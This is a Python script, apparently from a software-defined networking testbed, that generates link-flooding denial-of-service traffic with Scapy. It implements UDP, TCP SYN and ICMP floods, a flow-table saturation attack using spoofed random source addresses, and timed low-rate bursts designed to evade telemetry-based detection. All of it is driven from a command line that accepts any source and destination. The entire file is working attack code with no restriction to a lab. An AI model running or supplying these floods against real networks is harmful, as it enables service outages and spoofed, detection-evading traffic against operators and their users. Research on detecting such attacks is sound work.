#!/usr/bin/env python3

"""
Attack Traffic Generators for LFA (Link Flooding Attack) Variants
- Link Flooding LFA
- Flow Rule Saturation LFA
- Telemetry Evasion LFA
"""

import argparse
import time
import random
import string
import threading
import logging
from scapy.all import IP, TCP, UDP, ICMP, send, conf
from datetime import datetime
import json

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Disable Scapy verbosity
conf.verbose = 0


class LinkFloodingAttack:
    """
    Link Flooding LFA Attack
    Floods bottleneck links with high-rate UDP/TCP SYN/ICMP packets
    """
    
    def __init__(self, source_ip, target_ips, duration_seconds=60, 
                 packet_rate=10000, attack_type='udp'):
        """
        Initialize Link Flooding attack
        
        Args:
            source_ip: Attacker IP
            target_ips: List of target IPs (bottleneck links)
            duration_seconds: Attack duration
            packet_rate: Packets per second
            attack_type: 'udp', 'tcp_syn', or 'icmp'
        """
        self.source_ip = source_ip
        self.target_ips = target_ips if isinstance(target_ips, list) else [target_ips]
        self.duration = duration_seconds
        self.packet_rate = packet_rate
        self.attack_type = attack_type
        self.is_running = True
        self.packet_count = 0
        self.start_time = None
        self.attack_start_time = datetime.now()

    def udp_flood(self):
        """UDP flooding attack"""
        logger.info(f'[LFA-UDP] Starting UDP flood from {self.source_ip}')
        logger.info(f'  Targets: {self.target_ips}')
        logger.info(f'  Duration: {self.duration}s')
        logger.info(f'  Rate: {self.packet_rate} pps')
        
        self.start_time = time.time()
        
        while self.is_running and (time.time() - self.start_time) < self.duration:
            try:
                target_ip = random.choice(self.target_ips)
                src_port = random.randint(1024, 65535)
                dst_port = random.randint(1024, 65535)
                
                # Create UDP payload
                payload_size = random.randint(512, 1472)
                payload = ''.join(random.choices(string.ascii_letters, k=payload_size))
                
                packet = IP(src=self.source_ip, dst=target_ip, flags=0) / \
                         UDP(sport=src_port, dport=dst_port) / \
                         payload
                
                send(packet, verbose=0)
                
                self.packet_count += 1
                
                # Rate limiting
                time.sleep(1.0 / self.packet_rate)
                
            except Exception as e:
                logger.debug(f'UDP flood error: {e}')
        
        logger.info(f'[LFA-UDP] Attack complete. Packets sent: {self.packet_count}')

    def tcp_syn_flood(self):
        """TCP SYN flooding attack"""
        logger.info(f'[LFA-TCP-SYN] Starting TCP SYN flood from {self.source_ip}')
        logger.info(f'  Targets: {self.target_ips}')
        logger.info(f'  Duration: {self.duration}s')
        logger.info(f'  Rate: {self.packet_rate} pps')
        
        self.start_time = time.time()
        
        while self.is_running and (time.time() - self.start_time) < self.duration:
            try:
                target_ip = random.choice(self.target_ips)
                dst_port = random.choice([80, 443, 22, 3306, 5432])
                
                packet = IP(src=self.source_ip, dst=target_ip, flags=0) / \
                         TCP(sport=random.randint(1024, 65535), 
                             dport=dst_port, 
                             flags='S',
                             seq=random.randint(0, 2**32-1))
                
                send(packet, verbose=0)
                
                self.packet_count += 1
                
                time.sleep(1.0 / self.packet_rate)
                
            except Exception as e:
                logger.debug(f'TCP SYN flood error: {e}')
        
        logger.info(f'[LFA-TCP-SYN] Attack complete. Packets sent: {self.packet_count}')

    def icmp_flood(self):
        """ICMP flood attack"""
        logger.info(f'[LFA-ICMP] Starting ICMP flood from {self.source_ip}')
        logger.info(f'  Targets: {self.target_ips}')
        logger.info(f'  Duration: {self.duration}s')
        logger.info(f'  Rate: {self.packet_rate} pps')
        
        self.start_time = time.time()
        
        while self.is_running and (time.time() - self.start_time) < self.duration:
            try:
                target_ip = random.choice(self.target_ips)
                
                payload = ''.join(random.choices(string.ascii_letters, k=random.randint(32, 1472)))
                
                packet = IP(src=self.source_ip, dst=target_ip, flags=0) / \
                         ICMP(type=8, code=0) / \
                         payload
                
                send(packet, verbose=0)
                
                self.packet_count += 1
                
                time.sleep(1.0 / self.packet_rate)
                
            except Exception as e:
                logger.debug(f'ICMP flood error: {e}')
        
        logger.info(f'[LFA-ICMP] Attack complete. Packets sent: {self.packet_count}')

    def start_attack(self):
        """Start the attack based on type"""
        if self.attack_type == 'udp':
            self.udp_flood()
        elif self.attack_type == 'tcp_syn':
            self.tcp_syn_flood()
        elif self.attack_type == 'icmp':
            self.icmp_flood()
        else:
            logger.error(f'Unknown attack type: {self.attack_type}')

    def stop(self):
        """Stop the attack"""
        self.is_running = False
        logger.info(f'Attack stopped. Total packets: {self.packet_count}')


class FlowRuleSaturationAttack:
    """
    Flow Rule Saturation LFA Attack
    Generates millions of unique flows to exhaust OVS flow table
    """
    
    def __init__(self, source_ip, target_ip, duration_seconds=60, 
                 flow_rate=10000):
        """
        Initialize Flow Rule Saturation attack
        
        Args:
            source_ip: Attacker base IP
            target_ip: Target IP range
            duration_seconds: Attack duration
            flow_rate: Unique flows per second
        """
        self.source_ip = source_ip
        self.target_ip = target_ip
        self.duration = duration_seconds
        self.flow_rate = flow_rate
        self.is_running = True
        self.flow_count = 0
        self.start_time = None

    def generate_random_ip(self):
        """Generate random IP address"""
        return f'{random.randint(10, 172)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}'

    def saturate_flow_table(self):
        """Generate unique flows to saturate flow table"""
        logger.info(f'[FRS-LFA] Starting Flow Rule Saturation attack')
        logger.info(f'  Base Source: {self.source_ip}')
        logger.info(f'  Target: {self.target_ip}')
        logger.info(f'  Duration: {self.duration}s')
        logger.info(f'  Flow Rate: {self.flow_rate} flows/s')
        
        self.start_time = time.time()
        unique_src_ips = set()
        
        while self.is_running and (time.time() - self.start_time) < self.duration:
            try:
                # Generate unique source IP
                src_ip = self.generate_random_ip()
                unique_src_ips.add(src_ip)

                
                # Random ports
                src_port = random.randint(1024, 65535)
                dst_port = random.randint(1024, 65535)
                
                # Random protocol
                protocol = random.choice(['tcp', 'udp'])
                
                if protocol == 'tcp':
                    packet = IP(src=src_ip, dst=self.target_ip) / \
                             TCP(sport=src_port, dport=dst_port, flags='S')
                else:
                    packet = IP(src=src_ip, dst=self.target_ip) / \
                             UDP(sport=src_port, dport=dst_port)
                
                send(packet, verbose=0)
                
                self.flow_count += 1
                
                # Rate limiting
                time.sleep(1.0 / self.flow_rate)
                
                if self.flow_count % 1000 == 0:
                    logger.info(f'  Generated {self.flow_count} flows, '
                               f'{len(unique_src_ips)} unique source IPs')
                
            except Exception as e:
                logger.debug(f'Flow saturation error: {e}')
        
        logger.info(f'[FRS-LFA] Attack complete. '
                   f'Total flows: {self.flow_count}, '
                   f'Unique source IPs: {len(unique_src_ips)}')

    def stop(self):
        """Stop the attack"""
        self.is_running = False


class TelemetryEvasionAttack:
    """
    Telemetry Evasion LFA Attack
    Low-rate periodic bursts designed to evade detection
    """
    
    def __init__(self, source_ip, target_ip, duration_seconds=60,
                 burst_rate=1000, burst_interval=5, burst_duration=1):
        """
        Initialize Telemetry Evasion attack
        
        Args:
            source_ip: Attacker IP
            target_ip: Target IP
            duration_seconds: Total attack duration
            burst_rate: Packets per second during burst
            burst_interval: Seconds between bursts
            burst_duration: Duration of each burst in seconds
        """
        self.source_ip = source_ip
        self.target_ip = target_ip
        self.duration = duration_seconds
        self.burst_rate = burst_rate
        self.burst_interval = burst_interval
        self.burst_duration = burst_duration
        self.is_running = True
        self.packet_count = 0
        self.start_time = None

    def adaptive_burst_flood(self):
        """Generate adaptive burst flooding"""
        logger.info(f'[TE-LFA] Starting Telemetry Evasion attack')
        logger.info(f'  Source: {self.source_ip}')
        logger.info(f'  Target: {self.target_ip}')
        logger.info(f'  Duration: {self.duration}s')
        logger.info(f'  Burst Rate: {self.burst_rate} pps')
        logger.info(f'  Burst Interval: {self.burst_interval}s')
        logger.info(f'  Burst Duration: {self.burst_duration}s')
        
        self.start_time = time.time()
        burst_count = 0
        
        while self.is_running and (time.time() - self.start_time) < self.duration:
            # Idle period between bursts
            burst_start = time.time()
            
            # Burst period
            while (time.time() - burst_start) < self.burst_duration:
                try:
                    packet = IP(src=self.source_ip, dst=self.target_ip) / \
                             UDP(sport=random.randint(1024, 65535),
                                 dport=random.randint(1024, 65535)) / \
                             ''.join(random.choices(string.ascii_letters, k=random.randint(100, 512)))
                    
                    send(packet, verbose=0)
                    self.packet_count += 1
                    
                    time.sleep(1.0 / self.burst_rate)
                    
                except Exception as e:
                    logger.debug(f'Telemetry evasion error: {e}')
            
            burst_count += 1
            
            # Idle period
            logger.info(f'  Completed burst {burst_count} ({self.burst_duration}s), '
                       f'sleeping for {self.burst_interval}s...')
            time.sleep(self.burst_interval)
        
        logger.info(f'[TE-LFA] Attack complete. Total packets: {self.packet_count}')

    def stop(self):
        """Stop the attack"""
        self.is_running = False


def main():
    parser = argparse.ArgumentParser(
        description='LFA Attack Traffic Generator'
    )
    parser.add_argument('--attack', required=True,
                        choices=['link_flooding', 'flow_saturation', 'telemetry_evasion'],
                        help='Type of attack')
    parser.add_argument('--src', required=True, help='Source IP address')
    parser.add_argument('--dst', required=True, help='Destination IP address')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')
    parser.add_argument('--rate', type=int, default=5000, help='Packet/flow rate per second')
    parser.add_argument('--type', default='udp',
                        choices=['udp', 'tcp_syn', 'icmp'],
                        help='Attack type (for link flooding)')
    
    args = parser.parse_args()
    
    logger.info('Starting Attack Traffic Generator')
    logger.info(f'  Attack Type: {args.attack}')
    logger.info(f'  Source: {args.src}')
    logger.info(f'  Destination: {args.dst}')
    logger.info(f'  Duration: {args.duration}s')
    
    attack = None
    
    try:
        if args.attack == 'link_flooding':
            attack = LinkFloodingAttack(
                args.src,
                args.dst,
                duration_seconds=args.duration,
                packet_rate=args.rate,
                attack_type=args.type
            )
            attack.start_attack()
            
        elif args.attack == 'flow_saturation':
            attack = FlowRuleSaturationAttack(
                args.src,
                args.dst,
                duration_seconds=args.duration,
                flow_rate=args.rate
            )
            attack.saturate_flow_table()
            
        elif args.attack == 'telemetry_evasion':
            attack = TelemetryEvasionAttack(
                args.src,
                args.dst,
                duration_seconds=args.duration,
                burst_rate=args.rate
            )
            attack.adaptive_burst_flood()
            
    except KeyboardInterrupt:
        logger.info('Attack interrupted')
        if attack:
            attack.stop()
    except Exception as e:
        logger.error(f'Error during attack: {e}')
        if attack:
            attack.stop()


if __name__ == '__main__':
    main()
